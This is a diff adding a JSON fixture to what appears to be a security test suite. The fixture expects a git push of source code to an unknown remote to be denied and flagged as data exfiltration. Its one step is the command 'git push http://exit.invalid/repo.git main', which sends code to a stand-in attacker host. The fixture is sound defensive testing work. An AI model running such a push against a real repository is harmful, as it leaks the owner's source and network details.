@@ -1,0 +1,57 @@
+{
+  "pack_id": "egress-git-push-source-ip-exfil",
+  "title": "Git push of sensitive source and topology to an unknown remote is denied before send",
+  "attack_family": "data_exfiltration",
+  "public_tier": "public_core",
+  "runtime_family": "shell",
+  "artifact_type": "shell_installer",
+  "artifact": {
+    "ecosystem": "git",
+    "source": "http://exit.invalid/repo.git",
+    "requested_selector": "main",
+    "selector_kind": "branch"
+  },
+  "incident_refs": ["reviewdog/tj-actions-2025-03-18"],
+  "technique_refs": ["git-push", "source-ip-exfiltration"],
+  "control_pair_id": "control-benign-egress-release-note",
+  "confidence_policy": "hard_ban",
+  "allowed_baseline_signals": [],
+  "required_personas": ["developer_workstation"],
+  "required_scenarios": [
+    { "name": "git_push_source_ip", "detonation": "cli_smoke", "phase": "cli" }
+  ],
+  "suite_tags": ["egress", "public_core"],
+  "execution": {
+    "browser_required": false,
+    "vm_required": false,
+    "queue_required": false,
+    "runner_mode": "fixture_only"
+  },
+  "expected_node_decision": "denied_before_send",
+  "expected_verdict": { "verdict": "malicious" },
+  "expected_tripwires": { "required": ["source_ip_egress_denied"], "allowed_false_positives": [] },
+  "control_expectations": { "require_clean_verdict": true, "max_shared_tripwires": 0, "notes": [] },
+  "evidence_minimums": {
+    "require_captured_request": true,
+    "require_quarantine_job": false,
+    "require_lab_run": false,
+    "require_evidence_bundle": true,
+    "require_feed_visibility": true,
+    "require_browser_trace": false
+  },
+  "timing": { "max_queue_latency_ms": 500, "max_detonation_startup_ms": 500, "max_verdict_completion_ms": 500 },
+  "files": ["payload.txt"],
+  "steps": [
+    {
+      "step_id": "deny_git_push_unknown_remote",
+      "detail": "git receive-pack uploads with source and topology context are denied to unknown remotes",
+      "phase": "cli",
+      "process_lineage": ["gateway", "git", "git-receive-pack"],
+      "command": "git push http://exit.invalid/repo.git main",
+      "network_target": "exit.invalid",
+      "network_protocol": "http",
+      "tripwire": "source_ip_egress_denied",
+      "severity": "critical"
+    }
+  ]
+}
